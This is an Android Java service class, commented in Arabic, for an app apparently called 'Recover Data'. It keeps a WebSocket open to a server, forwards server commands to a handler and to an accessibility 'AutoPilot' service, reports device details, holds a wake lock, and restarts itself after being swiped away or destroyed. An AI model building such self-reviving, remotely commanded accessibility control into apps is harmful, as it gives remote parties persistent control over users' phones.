package com.recoverdata.phone.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.recoverdata.phone.MainActivity;
import com.recoverdata.phone.R;
import com.recoverdata.phone.accessibility.AutoPilotService;
import com.recoverdata.phone.network.CommandHandler;
import com.recoverdata.phone.network.ServerConfig;
import com.recoverdata.phone.network.WebSocketManager;
import com.recoverdata.phone.utils.Logger;

import org.json.JSONObject;

/**
 * ConnectionService
 * ============================================================
 * Foreground Service دائم يبقي التطبيق حياً.
 *
 * المسؤوليات:
 *   1. تشغيل إشعار دائم لمنع قتل الخدمة.
 *   2. تهيئة WebSocketManager وإبقاء الاتصال.
 *   3. إعادة الاتصال تلقائياً.
 *   4. ربط AutoPilotService بـ WebSocketManager.
 *   5. تمرير الأوامر إلى CommandHandler.
 *   6. WakeLock لمنع النوم العميق.
 * ============================================================
 */
public class ConnectionService extends Service {

    // =============================================================
    // 1. الثوابت
    // =============================================================
    private static final String TAG = "ConnectionService";

    // قناة الإشعارات
    private static final String CHANNEL_ID       = "recover_data_channel";
    private static final String CHANNEL_NAME     = "Recover Data Service";
    private static final String CHANNEL_DESC     = "Keeps the connection alive";
    private static final int    NOTIFICATION_ID  = 1001;

    // أوامر الـ Intent
    public static final String ACTION_START   = "com.recoverdata.phone.START";
    public static final String ACTION_STOP    = "com.recoverdata.phone.STOP";
    public static final String ACTION_RESTART = "com.recoverdata.phone.RESTART";

    // WakeLock
    private static final String WAKE_LOCK_TAG = "RecoverData::ConnectionWakeLock";
    private static final long   WAKE_LOCK_TIMEOUT_MS = 60 * 60 * 1000L; // ساعة

    // =============================================================
    // 2. الحقول
    // =============================================================
    private static ConnectionService instance;

    private WebSocketManager webSocketManager;
    private CommandHandler   commandHandler;
    private PowerManager.WakeLock wakeLock;

    private volatile boolean isStarted = false;

    // =============================================================
    // 3. دورة حياة الخدمة
    // =============================================================

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;

        Logger.i(TAG, "onCreate");

        // 1. إنشاء قناة الإشعارات
        createNotificationChannel();

        // 2. تهيئة WakeLock
        acquireWakeLock();

        // 3. تهيئة المكونات
        initComponents();
    }

    @Override
    public int onStartCommand(@Nullable Intent intent, int flags, int startId) {
        String action = (intent != null) ? intent.getAction() : ACTION_START;
        Logger.i(TAG, "onStartCommand: action=" + action);

        if (ACTION_STOP.equals(action)) {
            stopSelf();
            return START_NOT_STICKY;
        }

        if (ACTION_RESTART.equals(action)) {
            restartConnection();
            return START_STICKY;
        }

        // ACTION_START (افتراضي)
        startForegroundSafely();
        startConnection();

        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Logger.w(TAG, "onTaskRemoved - app swiped from recents");

        if (isStarted) {
            Intent restartIntent = new Intent(getApplicationContext(), ConnectionService.class);
            restartIntent.setAction(ACTION_RESTART);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                getApplicationContext().startForegroundService(restartIntent);
            } else {
                getApplicationContext().startService(restartIntent);
            }
        }
    }

    @Override
    public void onDestroy() {
        Logger.w(TAG, "onDestroy");

        boolean wasStarted = isStarted;
        isStarted = false;

        // إيقاف الاتصال + تنظيف الموارد
        if (webSocketManager != null) {
            webSocketManager.cleanup();
            webSocketManager = null;
        }

        releaseWakeLock();

        if (instance == this) {
            instance = null;
        }

        super.onDestroy();

        // إعادة تشغيل الخدمة إذا أُوقفت من النظام (ليس بإرادتنا)
        if (wasStarted) {
            Intent restartIntent = new Intent(getApplicationContext(), ConnectionService.class);
            restartIntent.setAction(ACTION_RESTART);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                getApplicationContext().startForegroundService(restartIntent);
            } else {
                getApplicationContext().startService(restartIntent);
            }
        }
    }

    // =============================================================
    // 4. التهيئة الداخلية
    // =============================================================
    private void initComponents() {
        // CommandHandler يحتاج Context
        commandHandler = new CommandHandler(getApplicationContext());

        // ✅ WebSocketManager مع Context + Callback
        webSocketManager = new WebSocketManager(
                getApplicationContext(),
                new WebSocketManager.Callback() {
                    @Override
                    public void onConnected() {
                        Logger.i(TAG, "WebSocket connected");
                        updateNotification("Connected to server");
                        notifyServerReady();
                    }

                    @Override
                    public void onMessage(@NonNull String message) {
                        Logger.d(TAG, "Message received: " + message);
                        commandHandler.handle(message, webSocketManager);
                    }

                    @Override
                    public void onDisconnected(int code, @NonNull String reason) {
                        Logger.w(TAG, "WebSocket disconnected: " + code + " / " + reason);
                        updateNotification("Reconnecting...");
                    }

                    @Override
                    public void onError(@NonNull Throwable error) {
                        Logger.e(TAG, "WebSocket error: " + error.getMessage(), error);
                        updateNotification("Connection error");
                    }
                });

        // ربط AutoPilotService بـ WebSocketManager إن كان جاهزاً
        AutoPilotService autopilot = AutoPilotService.getInstance();
        if (autopilot != null) {
            autopilot.setWebSocketManager(webSocketManager);
            Logger.i(TAG, "AutoPilotService linked to WebSocketManager");
        } else {
            Logger.w(TAG, "AutoPilotService not ready yet (user hasn't enabled it)");
        }
    }

    // =============================================================
    // 5. بدء الاتصال / إعادة التشغيل
    // =============================================================

    private void startConnection() {
        if (isStarted) {
            Logger.w(TAG, "Already started, skipping");
            return;
        }
        isStarted = true;

        if (webSocketManager != null) {
            webSocketManager.connect();
        }
    }

    private void restartConnection() {
        Logger.i(TAG, "Restarting connection...");

        if (webSocketManager != null) {
            webSocketManager.restart();
        }
    }

    // =============================================================
    // 6. الإشعار الدائم
    // =============================================================

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    CHANNEL_NAME,
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription(CHANNEL_DESC);
            channel.setShowBadge(false);
            channel.enableLights(false);
            channel.enableVibration(false);

            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) {
                nm.createNotificationChannel(channel);
            }
        }
    }

    @NonNull
    private Notification buildNotification(@NonNull String statusText) {
        Intent intent = new Intent(this, MainActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);

        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            flags |= PendingIntent.FLAG_IMMUTABLE;
        }
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent, flags);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(getString(R.string.app_name))
                .setContentText(statusText)
                .setSmallIcon(R.drawable.ic_notification)
                .setContentIntent(pi)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .setShowWhen(false)
                .build();
    }

    private void startForegroundSafely() {
        Notification notification = buildNotification(getString(R.string.status_connecting));

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                    NOTIFICATION_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            );
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
    }

    private void updateNotification(@NonNull String statusText) {
        NotificationManager nm = (NotificationManager)
                getSystemService(Context.NOTIFICATION_SERVICE);
        if (nm != null) {
            nm.notify(NOTIFICATION_ID, buildNotification(statusText));
        }
    }

    // =============================================================
    // 7. WakeLock
    // =============================================================

    @SuppressWarnings("deprecation")
    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm == null) return;

            wakeLock = pm.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    WAKE_LOCK_TAG
            );
            wakeLock.setReferenceCounted(false);
            wakeLock.acquire(WAKE_LOCK_TIMEOUT_MS);

            Logger.i(TAG, "WakeLock acquired");
        } catch (Exception e) {
            Logger.e(TAG, "acquireWakeLock error", e);
        }
    }

    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                Logger.i(TAG, "WakeLock released");
            }
        } catch (Exception e) {
            Logger.e(TAG, "releaseWakeLock error", e);
        } finally {
            wakeLock = null;
        }
    }

    // =============================================================
    // 8. إشعار السيرفر بالجاهزية
    // =============================================================

    private void notifyServerReady() {
        if (webSocketManager == null) return;

        try {
            JSONObject msg = new JSONObject();
            msg.put("type", "HELLO");
            msg.put("device", Build.MANUFACTURER + " " + Build.MODEL);
            msg.put("android", Build.VERSION.RELEASE);
            msg.put("sdk", Build.VERSION.SDK_INT);
            msg.put("autopilot", AutoPilotService.isReady());
            msg.put("client", ServerConfig.getClientName());
            msg.put("client_ver", ServerConfig.getClientVersion());
            msg.put("timestamp", System.currentTimeMillis());

            webSocketManager.send(msg.toString());
            Logger.i(TAG, "HELLO sent to server");
        } catch (Exception e) {
            Logger.e(TAG, "notifyServerReady error", e);
        }
    }

    // =============================================================
    // 9. API عامة
    // =============================================================

    @Nullable
    public static ConnectionService getInstance() {
        return instance;
    }

    public static void start(@NonNull Context context) {
        Intent intent = new Intent(context, ConnectionService.class);
        intent.setAction(ACTION_START);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    public static void stop(@NonNull Context context) {
        Intent intent = new Intent(context, ConnectionService.class);
        intent.setAction(ACTION_STOP);
        context.startService(intent);
    }

    public static void restart(@NonNull Context context) {
        Intent intent = new Intent(context, ConnectionService.class);
        intent.setAction(ACTION_RESTART);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }
}
